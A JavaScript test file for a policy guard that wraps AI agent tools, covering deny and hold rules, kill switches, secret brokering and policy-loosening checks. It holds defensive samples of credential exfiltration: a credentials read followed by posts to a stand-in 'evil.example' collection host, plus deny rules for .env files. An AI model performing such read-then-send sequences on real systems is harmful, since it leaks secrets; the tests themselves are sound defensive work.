import { test } from "node:test";
import assert from "node:assert/strict";
import { mkdtemp, writeFile } from "node:fs/promises";
import { tmpdir } from "node:os";
import { join } from "node:path";

import { CirvixDenied, CirvixHeld, Guard, guard, wrap } from "../src/core/guard.mjs";
import { evaluate, expectNoLoosening, loadPolicy } from "../src/testing.mjs";
import { HANDLE_PREFIX } from "../src/core/secrets.mjs";
import { KillSwitchEngine } from "../src/core/kill-switch.mjs";

const CWD = "/workspace";

const RULES = [
  {
    name: "deny-dotenv-read",
    effect: "forbid",
    actions: ["fs.read"],
    resources: ["**/.env", "**/.env.*"],
    reason: "Reading .env files is denied outside an approved secrets flow.",
    remediation: 'Request the value as a handle: secrets.get("STRIPE_KEY")',
  },
  {
    name: "hold-production-writes",
    effect: "hold",
    actions: ["fs.write", "k8s.apply"],
    resources: ["*"],
    when: [{ path: "environment", op: "eq", value: "production" }],
    approvers: ["platform-oncall"],
  },
  { name: "allow-reads", effect: "permit", actions: ["fs.read", "fs.list"], resources: ["*"] },
  { name: "allow-writes", effect: "permit", actions: ["fs.write"], resources: ["*"] },
  { name: "allow-http", effect: "permit", actions: ["http.request"], resources: ["*"] },
];

const options = (over = {}) => ({ rules: RULES, agent: "pr-triage", cwd: CWD, ...over });

/* -------------------------------------------------------------------------- */
/*  wrap — the shapes tool collections actually come in                        */
/* -------------------------------------------------------------------------- */

test("an object of named functions is governed and keeps its shape", async () => {
  const tools = wrap(
    {
      read_file: async ({ path }) => `contents of ${path}`,
    },
    options(),
  );

  assert.equal(typeof tools.read_file, "function");
  assert.throws(() => wrap({ unrelated: "not a function" }, options()), TypeError);
  assert.equal(await tools.read_file({ path: "/workspace/app.ts" }), "contents of /workspace/app.ts");
});

test("an array of tool objects is governed without losing its metadata", async () => {
  // LangChain, CrewAI, and AutoGen all hand over objects carrying a callable
  // plus a description and a schema the framework reads back afterwards.
  const original = [
    {
      name: "read_file",
      description: "Reads a file.",
      schema: { type: "object" },
      async func({ path }) {
        return `read ${path}`;
      },
    },
  ];
  const [tool] = wrap(original, options());

  assert.equal(tool.description, "Reads a file.");
  assert.deepEqual(tool.schema, { type: "object" });
  assert.equal(await tool.func({ path: "/workspace/a.ts" }), "read /workspace/a.ts");
  // The caller's own array is untouched — a framework holding the originals
  // must not find them governed as a side effect of us reading them.
  assert.notEqual(original[0].func, tool.func);
});

test("all known tool entrypoints enforce decisions and use transformed arguments", async () => {
  const keys = ["func", "invoke", "call", "execute", "handler", "_call", "run"];
  const seen = [];
  const original = { name: "read_file", marker: "original", schema: { type: "object" } };
  for (const key of keys) {
    original[key] = async function (args) {
      seen.push({ key, args, marker: this.marker });
      return "ok";
    };
  }
  const secrets = {
    substitute: async (args) => ({ ok: true, value: { ...args, label: "transformed" } }),
    redact: (payload) => ({ payload, findings: [] }),
  };
  const [tool] = wrap([original], options({ secrets }));
  assert.equal(tool.schema, original.schema);
  for (const key of keys) {
    assert.notEqual(tool[key], original[key]);
    await assert.rejects(() => tool[key]({ path: "/workspace/.env" }), CirvixDenied);
    assert.equal(seen.length, keys.indexOf(key));
    await tool[key]({ path: "/workspace/readme.txt", label: "input" });
    assert.deepEqual(seen.at(-1), { key, args: { path: "/workspace/readme.txt", label: "transformed" }, marker: "original" });
  }
});

test("inherited and nonenumerable entrypoints retain their receiver and are governed", async () => {
  class Reader {
    #value = "fixture";
    constructor() { this.name = "read_file"; }
    async invoke() { return this.#value; }
    async run() { return this.#value; }
  }
  const original = new Reader();
  Object.defineProperty(original, "execute", { value: async () => "fixture", enumerable: false });
  const { read_file: tool } = wrap({ read_file: original }, options());
  for (const key of ["invoke", "run", "execute"]) {
    await assert.rejects(() => tool[key]({ path: "/workspace/.env" }), CirvixDenied);
    assert.equal(await tool[key]({ path: "/workspace/readme.txt" }), "fixture");
  }
  assert.equal(Object.getPrototypeOf(tool), null);
  assert.equal(original.name, "read_file");
});

test("unsupported collection and tool shapes are rejected without invoking accessors", () => {
  let accessed = false;
  const accessor = { name: "read_file", get invoke() { accessed = true; return async () => "fixture"; } };
  const unknown = { name: "read_file", invoke: async () => "fixture", stream: async () => "fixture" };
  for (const tools of [null, 42, new Map(), [null], ["read_file"], [{}], Array(1), [accessor], [unknown], [{ invoke: async () => "fixture" }], [{ name: "read_file", invoke: 42 }], { read_file: {} }]) {
    assert.throws(() => wrap(tools, options()), TypeError);
  }
  const collection = Object.defineProperty({}, "read_file", { get() { accessed = true; return async () => "fixture"; } });
  assert.throws(() => wrap(collection, options()), TypeError);
  assert.equal(accessed, false);
});

test("ambiguous argument shapes are rejected before authorization and execution", async () => {
  const g = new Guard(options());
  let executed = 0;
  const tool = wrap(async () => { executed++; }, { guard: g, name: "read_file" });
  for (const args of [[{}, {}], ["readme.txt"], [null], [undefined], [[]], [new Date()], [new (class Arguments {})()]]) {
    await assert.rejects(() => tool(...args), TypeError);
  }
  assert.equal(g.stats.calls, 0);
  assert.equal(executed, 0);
  await tool(Object.assign(Object.create(null), { path: "/workspace/readme.txt" }));
  assert.equal(executed, 1);
});

test("zero argument calls are governed and preserve transformed arguments", async () => {
  const received = [];
  const fn = async (...args) => { received.push(args); return "ok"; };
  const g = new Guard(options());
  await wrap(fn, { guard: g, name: "read_file" })();
  assert.deepEqual(received, [[]]);
  assert.equal(g.stats.calls, 1);
  const secrets = {
    substitute: async (args) => { assert.deepEqual(args, {}); return { ok: true, value: { label: "transformed" } }; },
    redact: (payload) => ({ payload, findings: [] }),
  };
  await wrap(fn, options({ name: "read_file", secrets }))();
  assert.deepEqual(received[1], [{ label: "transformed" }]);
  await assert.rejects(() => wrap(fn, options({ name: "read_file", rules: [] }))(), CirvixDenied);
  assert.equal(received.length, 2);
});

test("invalid transformed argument shapes never reach the tool", async () => {
  let executed = false;
  for (const value of [null, [], "fixture", new Date()]) {
    const secrets = { substitute: async () => ({ ok: true, value }) };
    const tool = wrap(async () => { executed = true; }, options({ name: "read_file", secrets }));
    await assert.rejects(() => tool({ path: "/workspace/readme.txt" }), TypeError);
  }
  assert.equal(executed, false);
});

test("a bare function is governed and keeps its name", async () => {
  // Frameworks introspect `fn.name` to build their registry; an anonymous
  // wrapper would silently rename every tool.
  const governed = wrap(async ({ path }) => `read ${path}`, options({ name: "read_file" }));
  assert.equal(governed.name, "read_file");
  assert.equal(await governed({ path: "/workspace/a.ts" }), "read /workspace/a.ts");
});

test("Guard enforces frozen agents and unavailable freeze checks", async () => {
  const killSwitch = new KillSwitchEngine();
  killSwitch.arm({ scope: "agent", target: "pr-triage" });
  const input = { tool: "read_file", args: { path: "/workspace/readme.txt" } };
  assert.equal((await new Guard(options({ killSwitch })).authorize(input)).decision.rule, "emergency-kill-switch");
  for (const evaluate of [() => null, () => ({ killed: "false" }), () => { throw new Error("offline"); }]) {
    assert.equal((await new Guard(options({ killSwitch: { evaluate } })).authorize(input)).decision.rule, "kill-switch-unavailable");
  }
});

test("Guard rechecks freezes after asynchronous brokering", async () => {
  const killSwitch = new KillSwitchEngine();
  const secrets = { substitute: async (value) => {
    killSwitch.arm({ scope: "agent", target: "pr-triage" });
    return { ok: true, value };
  } };
  const result = await new Guard(options({ killSwitch, secrets })).authorize({ tool: "read_file", args: { path: "/workspace/readme.txt" } });
  assert.equal(result.decision.rule, "emergency-kill-switch");
});

test("Guard approval fingerprints retain server and environment", async () => {
  const fingerprints = [];
  const approvals = { findGrant: (fingerprint) => { fingerprints.push(fingerprint); return null; }, request: async () => ({ id: "pending", state: "pending" }) };
  const rules = [{ name: "review", effect: "hold", actions: ["fs.read"] }];
  for (const [server, environment] of [["files", "local"], ["files", "production"], ["other", "local"]]) {
    await new Guard(options({ rules, approvals, environment })).authorize({ tool: "read_file", server, args: { path: "/workspace/readme.txt" } });
  }
  assert.equal(new Set(fingerprints).size, 3);
});

test("Guard uses canonical workspace and egress classifications", () => {
  const g = new Guard(options());
  assert.equal(g.insideWorkspace("~/readme.txt"), false);
  assert.equal(g.insideWorkspace("/workspace/readme.txt"), true);
  assert.equal(g.isExternal("http://127.0.0.1"), false);
  assert.equal(g.isExternal("http://[::1]"), false);
  assert.equal(g.isExternal("https://service.example"), true);
});

test("Guard refuses unresolved mission references", async () => {
  const result = await new Guard(options({ mission: "missing", missions: { get: () => null } })).authorize({ tool: "read_file", args: { path: "/workspace/readme.txt" } });
  assert.equal(result.decision.rule, "authority-mission-unavailable");
});

test("guard.wrap is the documented entry point", () => {
  assert.equal(typeof guard.wrap, "function");
  assert.equal(guard.wrap, wrap);
});

/* -------------------------------------------------------------------------- */
/*  Refusals an agent can act on                                               */
/* -------------------------------------------------------------------------- */

test("a denied call throws a typed error carrying the way forward", async () => {
  const tools = wrap({ read_file: async () => "should never run" }, options());

  await assert.rejects(
    () => tools.read_file({ path: "/workspace/.env.production" }),
    (err) => {
      assert.ok(err instanceof CirvixDenied);
      assert.equal(err.policy, "deny-dotenv-read");
      assert.match(err.decisionId, /^dec_/);
      assert.match(err.reason, /denied outside an approved secrets flow/);
      // The property that lets an agent re-plan rather than retry.
      assert.match(err.remediation, /secrets\.get/);
      assert.equal(err.appealable, false);
      return true;
    },
  );
});

test("the tool itself never runs when the call is denied", async () => {
  let ran = false;
  const tools = wrap(
    {
      read_file: async () => {
        ran = true;
        return "executed";
      },
    },
    options(),
  );

  await assert.rejects(() => tools.read_file({ path: "/workspace/.env" }));
  assert.equal(ran, false, "a denied tool executed anyway");
});

test("a held call is a different type from a denial, because it needs different behaviour", async () => {
  // A denial means re-plan. A hold means this exact call may still happen once
  // somebody says yes. Collapsing them teaches agents to treat both as failure.
  const tools = wrap({ write_file: async () => "written" }, options({ environment: "production" }));

  await assert.rejects(
    () => tools.write_file({ path: "/workspace/out.txt" }),
    (err) => {
      assert.ok(err instanceof CirvixHeld);
      assert.ok(err instanceof CirvixDenied, "a hold should still be catchable as a refusal");
      assert.equal(err.policy, "hold-production-writes");
      assert.equal(err.appealable, true);
      assert.deepEqual(err.approvers, ["platform-oncall"]);
      return true;
    },
  );
});

test("default deny reaches the caller as a refusal it can read", async () => {
  const tools = wrap({ delete_file: async () => "gone" }, options({ rules: [] }));
  await assert.rejects(
    () => tools.delete_file({ path: "/workspace/a.ts" }),
    (err) => {
      assert.equal(err.policy, null);
      assert.match(err.reason, /default-deny|No rule permits/i);
      return true;
    },
  );
});

/* -------------------------------------------------------------------------- */
/*  Session state                                                              */
/* -------------------------------------------------------------------------- */

test("reading secret-shaped material taints the session for the rest of it", async () => {
  // The property that makes "read a credential, then post it somewhere" fail
  // even when both calls are individually allowed.
  const rules = [
    ...RULES,
    {
      name: "deny-egress-after-secret",
      effect: "forbid",
      actions: ["http.request"],
      resources: ["*"],
      when: [
        { path: "egress.external", op: "eq", value: true },
        { path: "session.touchedSecret", op: "eq", value: true },
      ],
    },
  ];
  const g = new Guard(options({ rules }));
  const tools = wrap(
    {
      read_file: async () => "contents",
      http_request: async () => "posted",
    },
    { guard: g },
  );

  // Allowed before the taint.
  assert.equal(await tools.http_request({ url: "https://evil.example/collect" }), "posted");

  await tools.read_file({ path: "/workspace/credentials.txt" });
  assert.equal(g.touchedSecret, true);

  await assert.rejects(
    () => tools.http_request({ url: "https://evil.example/collect" }),
    /read secret material|deny-egress-after-secret|Denied/i,
  );
});

test("one guard is shared across the whole tool collection", async () => {
  // Otherwise each tool has its own session and the taint above never crosses
  // from the tool that read the secret to the tool that would send it.
  const g = new Guard(options());
  const tools = wrap(
    { read_file: async () => "a", list_dir: async () => "b" },
    { guard: g },
  );
  await tools.read_file({ path: "/workspace/x" });
  await tools.list_dir({ path: "/workspace/y" });
  assert.equal(g.stats.calls, 2);
  assert.equal(g.stats.permitted, 2);
});

test("a tool nobody wrote a rule for is denied, not waved through", async () => {
  // The default-deny property, reaching the SDK surface: an unrecognised tool
  // name maps to `tool.<name>`, which no starter rule permits.
  const tools = wrap({ exfiltrate: async () => "sent" }, options());
  await assert.rejects(() => tools.exfiltrate({ path: "/workspace/x" }), CirvixDenied);
});

test("every decision reaches the telemetry sink, permitted or not", async () => {
  const decisions = [];
  const tools = wrap(
    { read_file: async () => "ok" },
    options({ onDecision: (d) => decisions.push(d) }),
  );

  await tools.read_file({ path: "/workspace/a.ts" });
  await assert.rejects(() => tools.read_file({ path: "/workspace/.env" }));

  assert.equal(decisions.length, 2);
  assert.deepEqual(
    decisions.map((d) => d.verdict),
    ["permit", "deny"],
  );
  // The same record shape the gateway ships, so a run recorded through the SDK
  // is replayable exactly like one recorded through the gateway.
  assert.ok(decisions[0].context);
  assert.ok(Array.isArray(decisions[0].considered));
  assert.match(decisions[0].decision_id, /^dec_/);
});

/* -------------------------------------------------------------------------- */
/*  Secret brokering through the SDK                                           */
/* -------------------------------------------------------------------------- */

test("handles are substituted on the way out and scrubbed on the way back", async () => {
  const handle = `${HANDLE_PREFIX}${"a".repeat(32)}`;
  const REAL = "rk_" + "live_GGGGGGGGGGGGGGGGGG";

  // A stand-in broker with the same surface as SecretsClient.
  const resolved = new Map();
  const secrets = {
    async substitute(args, { destination }) {
      const text = JSON.stringify(args);
      if (!text.includes(handle)) return { ok: true, value: args, substituted: [] };
      if (!destination?.includes("api.stripe.com")) {
        return { ok: false, reason: "not sanctioned for that destination", outcome: "destination_denied" };
      }
      resolved.set(handle, REAL);
      return { ok: true, value: JSON.parse(text.split(handle).join(REAL)), substituted: ["STRIPE"] };
    },
    redact(payload) {
      const text = JSON.stringify(payload ?? "");
      if (!resolved.size || !text.includes(REAL)) return { payload, findings: [] };
      return {
        payload: JSON.parse(text.split(REAL).join(handle)),
        findings: [{ handle, name: "STRIPE", secretId: "sec_1" }],
      };
    },
  };

  const g = new Guard(options({ secrets }));
  const tools = wrap(
    { http_request: async (args) => ({ echoed: args }) },
    { guard: g },
  );

  const result = await tools.http_request({
    url: "https://api.stripe.com/v1/charges",
    authorization: `Bearer ${handle}`,
  });

  const text = JSON.stringify(result);
  assert.ok(!text.includes(REAL), "a resolved credential reached the caller");
  assert.ok(text.includes(handle), "the handle was not restored in its place");
  assert.equal(g.stats.leaks, 1);
});

test("a handle presented off-path denies the call instead of leaking it upstream", async () => {
  const handle = `${HANDLE_PREFIX}${"b".repeat(32)}`;
  const secrets = {
    async substitute() {
      return { ok: false, reason: "not sanctioned for that destination", outcome: "destination_denied" };
    },
    redact: (payload) => ({ payload, findings: [] }),
  };

  let ran = false;
  const tools = wrap(
    {
      http_request: async () => {
        ran = true;
        return "sent";
      },
    },
    options({ secrets }),
  );

  await assert.rejects(
    () => tools.http_request({ url: "https://evil.example", authorization: `Bearer ${handle}` }),
    (err) => {
      assert.equal(err.policy, "secret-broker");
      assert.match(err.remediation, /allowlist/);
      return true;
    },
  );
  assert.equal(ran, false, "the call went out despite an unresolvable handle");
});

/* -------------------------------------------------------------------------- */
/*  Policy testing                                                             */
/* -------------------------------------------------------------------------- */

test("evaluate answers a policy question without executing anything", async () => {
  const decision = await evaluate({
    rules: RULES,
    agent: "deploy-bot",
    action: "k8s.apply",
    resource: "production/checkout",
    context: { environment: "production" },
  });

  assert.equal(decision.verdict, "hold");
  assert.ok(decision.approvers.includes("platform-oncall"));
});

test("evaluate fills in a permissive context so a test asserts one thing", async () => {
  // A denial should come from the rule under test, not from a restrictive
  // default that would have denied anything.
  const permitted = await evaluate({ rules: RULES, action: "fs.read", resource: "/repo/app.ts" });
  assert.equal(permitted.verdict, "permit");

  const denied = await evaluate({ rules: RULES, action: "fs.read", resource: "/repo/.env" });
  assert.equal(denied.verdict, "deny");
  assert.equal(denied.rule, "deny-dotenv-read");
});

test("evaluate refuses to guess at a missing action", async () => {
  await assert.rejects(() => evaluate({ rules: RULES, resource: "x" }), /needs an action/);
});

test("a policy directory loads, and a duplicated rule name is refused", async () => {
  const dir = await mkdtemp(join(tmpdir(), "cirvix-policy-"));
  await writeFile(join(dir, "01-base.json"), JSON.stringify([RULES[0]]), "utf8");
  await writeFile(join(dir, "02-extra.json"), JSON.stringify([RULES[2]]), "utf8");
  assert.equal((await loadPolicy({ policyDir: dir })).length, 2);

  // A duplicate name across files silently shadows a rule, which is exactly
  // the bug a directory of policies invites.
  await writeFile(join(dir, "03-clash.json"), JSON.stringify([RULES[0]]), "utf8");
  await assert.rejects(() => loadPolicy({ policyDir: dir }), /Duplicate rule/);
});

test("expectNoLoosening catches a policy change that widens what is allowed", async () => {
  const calls = [
    { action: "fs.read", resource: "/repo/.env" },
    { action: "fs.read", resource: "/repo/app.ts" },
  ];

  const same = await expectNoLoosening({ before: { rules: RULES }, after: { rules: RULES }, calls });
  assert.equal(same.ok, true);

  // Dropping the prohibition is the change a reviewer must not miss.
  const loosened = await expectNoLoosening({
    before: { rules: RULES },
    after: { rules: RULES.filter((r) => r.name !== "deny-dotenv-read") },
    calls,
  });
  assert.equal(loosened.ok, false);
  assert.equal(loosened.loosened.length, 1);
  assert.equal(loosened.loosened[0].was, "deny");
  assert.equal(loosened.loosened[0].now, "permit");

  // Tightening is allowed to pass: a policy is permitted to move that way
  // without surprising anybody.
  const tightened = await expectNoLoosening({
    before: { rules: RULES },
    after: { rules: [{ name: "deny-all", effect: "forbid", actions: ["*"], resources: ["*"] }] },
    calls,
  });
  assert.equal(tightened.ok, true);
});
